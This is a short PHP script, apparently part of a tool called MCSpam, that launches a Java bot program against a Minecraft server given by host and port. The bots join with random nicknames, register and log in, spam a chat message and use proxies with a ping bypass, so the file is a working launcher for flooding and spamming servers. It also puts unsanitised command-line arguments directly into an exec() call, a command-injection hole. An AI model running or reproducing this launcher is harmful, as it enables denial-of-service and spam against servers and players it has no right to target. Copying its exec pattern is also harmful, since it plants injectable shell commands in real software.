<?php
namespace mcspam;
$host = $argv[1];
$port = $argv[2];
$time = $argv[3];
$version = $argv[4];
$threads = $argv[5];
$mode = $argv[6];

if ($host && $port && $time && $version && $threads && $mode) {
    exec("java -jar Bot4.46.jar -move false -ping true -pingamount 1 -host $host -port $port -threads $threads -nicksize 12 -stay false -stayl 3500 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol 47 -msg 'New MCSpam coming soon <3' -amount 1 -proxymode $mode -login '/login javitatest123' -proxytries 2 -pingbypass 3 --delay 2000 -register '/register javitatest123 javitatest123' -time $time");
} else {
    die("Argument missing");
}